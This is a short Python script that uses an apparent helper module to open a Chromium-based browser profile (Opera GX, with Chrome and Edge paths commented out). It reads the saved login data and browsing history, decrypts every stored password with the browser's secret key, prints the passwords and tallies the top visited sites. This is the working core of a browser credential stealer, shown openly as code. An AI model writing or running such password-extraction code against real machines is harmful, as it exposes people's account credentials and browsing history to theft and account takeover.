from chromiumBrowser import Chromium
import dataComprehention


#googleChrome = Chromium("enviromentPath", "Default", "Google\\Chrome\\User Data", "GoogleChrome")
#googleChrome = Chromium("LOCALAPPDATA", "Default", "Microsoft\\Edge\\User Data", "MicrosoftEdge")

googleChrome = Chromium("APPDATA", "", "Opera Software\\Opera GX Stable", "OperaGX")

history = googleChrome.getHistory()
loginData = googleChrome.getLoginData()

for login in loginData:
    url = login["origin_url"]
    username = login["username_value"]
    ciphertext = login["password_value"]

    if url == "" or username == "": continue
    secretKey = googleChrome.getSecretKey()
    password = googleChrome.decryptPassword(ciphertext, secretKey)

    print(password)

topWebsites = dataComprehention.topWebsitesVisited(history)
#print(topWebsites)